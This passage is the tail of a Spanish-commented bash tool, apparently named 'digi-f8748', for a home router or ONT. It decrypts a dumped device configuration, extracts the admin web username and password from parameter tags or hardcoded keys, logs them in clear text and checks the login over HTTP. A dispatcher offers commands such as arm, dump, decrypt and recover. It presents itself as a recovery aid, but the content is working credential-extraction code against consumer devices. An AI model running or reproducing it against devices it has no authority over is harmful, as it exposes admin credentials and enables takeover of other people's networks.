      VAL=$(printf '%s' "$DEC" | python3 -c '
import sys
d = sys.stdin.buffer.read()
n = d[-1] if d else 0
if 1 <= n <= 16 and d.endswith(bytes([n]) * n): d = d[:-n]
if b"\x00" in d: d = d[:d.find(b"\x00")]
hs = []
for b in d:
    c = chr(b)
    if c in "0123456789abcdefABCDEF": hs.append(c)
    else: break
s = "".join(hs)
sys.stdout.write(bytes.fromhex(s[:len(s)//2*2]).decode("utf-8", "replace") if len(s) >= 2 else d.decode("utf-8", "replace"))
' 2>/dev/null)
      case $PID in
        1538) USER_TAG="$VAL";;
        1794) PASS_TAG="$VAL";;
      esac
    fi
    POS=$NPOS
  done

  USERNAME="${USER_TAG:-$USER_OSS}"; PASSWORD="${PASS_TAG:-$PASS_OSS}"
  [ -n "$USERNAME" ] && [ -n "$PASSWORD" ] || die "credenciales incompletas (tag602=${USER_TAG:+si}${USER_TAG:-no} tag702=${PASS_TAG:+si}${PASS_TAG:-no} oss_user=${USER_OSS:+si}${USER_OSS:-no} oss_pass=${PASS_OSS:+si}${PASS_OSS:-no})"
  USRC="hardcode:$HC_USER_KEY"; [ -n "$USER_TAG" ] && USRC="paramtag:0x602"
  PSRC="hardcode:$HC_PASS_KEY"; [ -n "$PASS_TAG" ] && PSRC="paramtag:0x702"
  log "== Credenciales del admin web =="
  log "  usuario: $USERNAME  ($USRC)"
  log "  password: $PASSWORD  ($PSRC)"
}

cmd_recover(){
  cmd_dump
  cmd_decrypt
  if [ -n "${USERNAME:-}" ]; then
    log "[*] confirmando login web..."
    if curl -s -m 15 -A Mozilla/5.0 "http://$HOST/?_type=loginData&_tag=login_entry" >/dev/null; then
      VUSER="$USERNAME"; VPASS="$PASSWORD"; cmd_verify || true
    fi
  fi
  log "[✓] listo. Cambia la contraseña del admin y desactiva el acceso remoto WAN."
}

# --------------------------------- dispatcher --------------------------------
banner
log "        digi-f8748 v$VERSION — $(date '+%Y-%m-%d %H:%M')"
log "        $TAGLINE"
case "$CMD" in
  info) cmd_info;;
  handshake) cmd_handshake;;
  arm) cmd_arm;;
  dump) cmd_dump;;
  decrypt) cmd_decrypt;;
  verify) cmd_verify;;
  disarm) cmd_disarm;;
  recover) cmd_recover;;
  *) die "comando desconocido: $CMD";;
esac
